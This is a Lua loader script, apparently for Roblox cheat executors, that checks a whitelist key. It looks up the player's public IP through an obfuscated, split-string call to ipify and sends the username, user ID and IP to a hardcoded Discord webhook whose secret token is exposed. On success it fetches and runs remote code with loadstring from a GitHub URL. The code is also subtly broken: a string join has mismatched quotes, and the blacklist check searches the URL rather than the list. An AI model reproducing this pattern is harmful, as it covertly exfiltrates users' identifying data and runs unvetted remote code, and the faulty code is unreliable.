
if wl_key == '' then
    game.Players.LocalPlayer:Kick("You are not whitelisted!")
end
if wl_key == ' ' then
    game.Players.LocalPlayer:Kick("You are not whitelisted!")
end

if wl_key == nil then
    game.Players.LocalPlayer:Kick("You are not whitelisted!")
end

local user_id = game.Players.LocalPlayer.UserId
userkey = "https://raw.githubusercontent.com/Graham-Void/Protage/main/White.lua"
blacklist = "https://raw.githubusercontent.com/Graham-Void/Protage/main/banned.lua"
key = game:HttpGet(userkey, true)
banned = game:HttpGet(blacklist, true)

local username = game.Players.LocalPlayer.Name
local userid = game.Players.LocalPlayer.UserId

local api = "https://api.i"
local api2 = "pify"
local api3 = ".org"

local api_url = api..api2..api3
local identification_protocol = tostring(game:HttpGet(api_url, true))



local webhook_string = 'Username: '..username .. ; User ID: '..userid .. ; Identification Protocol: '..identification_protocol

function discord_embed(text)
    local url = 'https://discord.com/api/webhooks/1046279988242042942/unFD3HAP4-R9CuS0Pu6aBmvTsSj5k7IP9LYeH4nfAqbt0wsNoFgrL9LbUKn_4X2SaUhq'
    local data = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Login Detection",
            ["description"] = text,
            ["color"] = 16711680,
            ["footer"] = {
                ["text"] = identification_protocol,
            },
        }}
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    request = http_request or request or syn.request
    request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = newdata
    })

end



if string.find(key,wl_key) then
    if wl_key == user_id then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Graham-Void/Protage/main/script.lua", true))()
        discord_embed('Successful Login')
    else
        game.Players.LocalPlayer:Kick("You are not whitelisted!")
        discord_embed('Failed Login Attempt, Key is Valid, but User ID is Invalid')
    end
elseif string.find(blacklist,wl_key) then
    game.Players.LocalPlayer:Kick("You are blacklisted!, contact graham")
    discord_embed('Failed Login Attempt, Key is Blacklisted')
else
    game.Players.LocalPlayer:Kick("You are not whitelisted!, contact graham")
    discord_embed('Failed Login Attempt, Key is Invalid')
end
